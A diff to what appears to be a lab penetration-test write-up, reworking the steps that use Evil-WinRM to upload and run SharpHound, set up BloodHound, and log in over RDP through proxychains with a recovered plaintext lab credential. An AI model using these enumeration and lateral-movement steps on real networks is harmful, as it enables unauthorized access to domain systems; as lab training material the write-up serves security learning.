@@ -637,15 +637,18 @@ dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
 ```
 Where we can see hporter:Gr8hambino!
 
-These credentials work with xfreerdp:
+Since we have a local administrator account on DEV01, we now can use Sharphound to map out the data from the AD domain for the Bloodhound tool so that we can visualize AD rights and memberships to check for more opportunities in privilege escalation, as well as possibly find how the hporter user credentials can be used in this AD domain. We can use Evil-WinRM to upload Sharphound.exe and create a zip file for BloodHound to enumerate the domain:
 ```
-proxychains xfreerdp /v:172.16.8.20 /u:hporter /p:Gr8hambino!
+upload /path/to/local/file C:\Users\victim\Desktop\file.exe
+./SharpHound.exe -c All
+download C:\Users\victim\Desktop\file.zip /path/to/local/destination
 ```
-and we see a screen with a black wallpaper and the bash terminal open.
+We then download the zip file to our local attack box. 
+If you have not downloaded BloodHound, there are steps on Github that may seem a bit complicated. I am on Ubuntu Linux, and the easiest way for me was to install Docker Desktop on my OS and have the container run on my localhost at port 8080. There, we can access our BloodHound instance and insert all of the files contained in the Sharphound zip file. For more information you can go to https://github.com/SpecterOps/BloodHound.
 
-We see that the command "net user /dom" grants us an output of all of the users in the domain, so we know that the hporter is a domain user account.
+Now that we have BloodHound open, we see that the hporter user has RDP privileges over the DEV01 host. We also see that most likely any Domain User account can RDP into DEV01 under "Inbound Execution Privileges," which is definitely a security risk since you generally want least privilege access. 
 
-We can exit out of the current xfreerdp session and connect our attack box's drive by using the /drive command:
+We now try the credentials with xfreerdp:
 ```
 proxychains xfreerdp /v:172.16.8.20 /u:hporter /p:Gr8hambino! /drive:(drivename),"/home/(drivename)"
 ```
@@ -653,14 +656,3 @@ After this, we can cd into the C:\share directory and run the command "net use" 
 ```
 C:\Share copy \\TSCLIENT\home\file
 ```
-Since we have a domain user account, we now can use Sharphound to map out the data from the AD domain for the Bloodhound tool so that we can visualize AD rights and memberships to check for more opportunities in privilege escalation.
-```
-C:\Share> copy \\TSCLIENT\home\SharpHound.exe
-C:\Share> SharpHound.exe -c All
-```
-This creates a SharpHound zip file that I downloaded using EvilWin-RM's "download" command using the Administrator account. 
-If you have not downloaded BloodHound, there are steps on Github that may seem a bit complicated. I am on Ubuntu Linux, and the easiest way for me was to install Docker Desktop on my OS and have the container run on my localhost at port 8080. There, we can access our BloodHound instance and insert all of the files contained in the Sharphound zip file. For more information you can go to https://github.com/SpecterOps/BloodHound.
-
-
-
-
